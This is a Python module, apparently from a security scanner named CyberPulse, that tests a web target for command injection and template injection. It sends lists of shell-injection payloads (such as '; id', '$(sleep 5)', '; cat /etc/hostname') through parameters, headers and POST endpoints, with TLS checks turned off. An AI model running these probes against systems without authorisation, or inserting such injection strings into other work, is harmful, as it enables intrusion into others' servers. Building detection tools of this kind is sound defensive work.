"""Module 32 — Remote Code Execution (RCE) Detection.

Tests for OS command injection and RCE vulnerabilities in parameters,
headers, and API endpoints.
"""

import json
import logging
import re
import time
from pathlib import Path

import requests

logger = logging.getLogger("cyberpulse.modules.m32")

# Time-based detection payloads (safe — uses sleep/ping to detect blind RCE)
TIME_PAYLOADS = [
    ("; sleep 5", 5),
    ("| sleep 5", 5),
    ("|| sleep 5", 5),
    ("& sleep 5", 5),
    ("&& sleep 5", 5),
    ("`sleep 5`", 5),
    ("$(sleep 5)", 5),
    ("%0asleep 5", 5),
    ("; ping -c 5 127.0.0.1", 4),
    ("| ping -c 5 127.0.0.1", 4),
]

# Output-based detection payloads paired with expected output
OUTPUT_PAYLOADS = [
    ("; id", r"uid=\d+"),
    ("| id", r"uid=\d+"),
    ("; whoami", r"(?:root|www-data|apache|nginx|nobody|admin)"),
    ("| whoami", r"(?:root|www-data|apache|nginx|nobody|admin)"),
    ("; cat /etc/hostname", r".+"),
    ("; uname -a", r"Linux"),
    ("| uname -a", r"Linux"),
    ("; echo cyberpulse_rce_test", r"cyberpulse_rce_test"),
    ("| echo cyberpulse_rce_test", r"cyberpulse_rce_test"),
    ("$(echo cyberpulse_rce_test)", r"cyberpulse_rce_test"),
]

# Parameters commonly vulnerable to command injection
INJECTABLE_PARAMS = [
    "cmd", "exec", "command", "execute", "ping", "query",
    "host", "ip", "address", "domain", "url", "target",
    "filename", "file", "path", "dir", "log",
]


class Scanner:
    name = "Remote Code Execution Detection"
    phase = "exploitation"
    description = "Tests for OS command injection and RCE vulnerabilities"

    def __init__(self, target: str, output_dir: Path, config: dict):
        self.target = target
        self.output_dir = Path(output_dir)
        self.config = config
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 CyberPulse/1.0"
        self.session.verify = False

    def run(self) -> dict:
        findings = []
        raw_lines = [f"RCE / Command Injection testing for {self.target}"]
        base_url = self._get_base_url()

        # Phase 1: Output-based detection on common parameters
        raw_lines.append("\n[Phase 1: Output-based RCE Detection]")
        for param in INJECTABLE_PARAMS:
            for payload, pattern in OUTPUT_PAYLOADS:
                url = f"{base_url}/?{param}={payload}"
                try:
                    resp = self.session.get(url, timeout=10)
                    if resp.status_code == 200 and re.search(pattern, resp.text):
                        findings.append({
                            "type": "rce_output",
                            "parameter": param,
                            "payload": payload,
                            "detail": f"Command injection via '{param}' — output matched: {pattern}",
                            "severity": "critical",
                        })
                        raw_lines.append(f"  CRITICAL: RCE via ?{param}={payload}")
                        break
                except Exception:
                    continue

        # Phase 2: Time-based blind detection on select parameters
        raw_lines.append("\n[Phase 2: Time-based Blind RCE Detection]")
        for param in INJECTABLE_PARAMS[:6]:
            for payload, delay in TIME_PAYLOADS[:4]:
                url = f"{base_url}/?{param}=127.0.0.1{payload}"
                try:
                    start = time.time()
                    self.session.get(url, timeout=delay + 5)
                    elapsed = time.time() - start
                    if elapsed >= delay - 1:
                        findings.append({
                            "type": "rce_blind",
                            "parameter": param,
                            "payload": payload,
                            "delay": f"{elapsed:.1f}s (expected {delay}s)",
                            "detail": f"Blind RCE via '{param}' — time delay confirmed ({elapsed:.1f}s)",
                            "severity": "critical",
                        })
                        raw_lines.append(f"  CRITICAL: Blind RCE {param} delay={elapsed:.1f}s")
                        break
                except Exception:
                    continue

        # Phase 3: Header injection (Host, X-Forwarded-For, Referer)
        raw_lines.append("\n[Phase 3: Header-based Injection]")
        test_headers = {
            "X-Forwarded-For": "; echo cyberpulse_rce_test",
            "Referer": "http://evil.com/$(echo cyberpulse_rce_test)",
            "X-Custom-IP": "127.0.0.1; id",
        }
        for header, payload in test_headers.items():
            try:
                resp = self.session.get(base_url, headers={header: payload}, timeout=10)
                if "cyberpulse_rce_test" in resp.text or re.search(r"uid=\d+", resp.text):
                    findings.append({
                        "type": "rce_header",
                        "header": header,
                        "detail": f"Command injection via {header} header",
                        "severity": "critical",
                    })
                    raw_lines.append(f"  CRITICAL: RCE via {header} header")
            except Exception:
                continue

        # Phase 4: POST-based injection
        raw_lines.append("\n[Phase 4: POST-based Injection]")
        post_endpoints = ["/api/ping", "/api/lookup", "/api/exec", "/tools/ping",
                          "/tools/dns", "/admin/exec", "/cgi-bin/test"]
        for endpoint in post_endpoints:
            for param in ["host", "ip", "cmd", "target"]:
                for payload, pattern in OUTPUT_PAYLOADS[:3]:
                    try:
                        resp = self.session.post(
                            f"{base_url}{endpoint}",
                            data={param: f"127.0.0.1{payload}"},
                            timeout=10,
                        )
                        if resp.status_code == 200 and re.search(pattern, resp.text):
                            findings.append({
                                "type": "rce_post",
                                "endpoint": endpoint,
                                "parameter": param,
                                "detail": f"POST RCE at {endpoint} via '{param}'",
                                "severity": "critical",
                            })
                            raw_lines.append(f"  CRITICAL: POST RCE {endpoint} via {param}")
                            break
                    except Exception:
                        continue

        # Phase 5: SSTI detection
        raw_lines.append("\n[Phase 5: Server-Side Template Injection]")
        ssti_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("{{config}}", "SECRET_KEY"),
            ("{{self.__class__}}", "__class__"),
        ]
        for param in ["name", "user", "search", "q", "template"]:
            for payload, indicator in ssti_payloads:
                try:
                    url = f"{base_url}/?{param}={payload}"
                    resp = self.session.get(url, timeout=10)
                    if indicator in resp.text and payload not in resp.text:
                        findings.append({
                            "type": "ssti",
                            "parameter": param,
                            "payload": payload,
                            "detail": f"SSTI via '{param}' with payload {payload}",
                            "severity": "critical",
                        })
                        raw_lines.append(f"  CRITICAL: SSTI via {param}")
                        break
                except Exception:
                    continue

        raw_output = "\n".join(raw_lines)
        outfile = self.output_dir / "32_rce.json"
        with open(outfile, "w", encoding="utf-8") as f:
            json.dump({"findings": findings}, f, indent=2)

        logger.info("RCE scan %s: %d findings", self.target, len(findings))
        return {"findings": findings, "raw_output": raw_output}

    def _get_base_url(self) -> str:
        for scheme in ("https", "http"):
            try:
                self.session.head(f"{scheme}://{self.target}", timeout=5)
                return f"{scheme}://{self.target}"
            except Exception:
                continue
        return f"http://{self.target}"
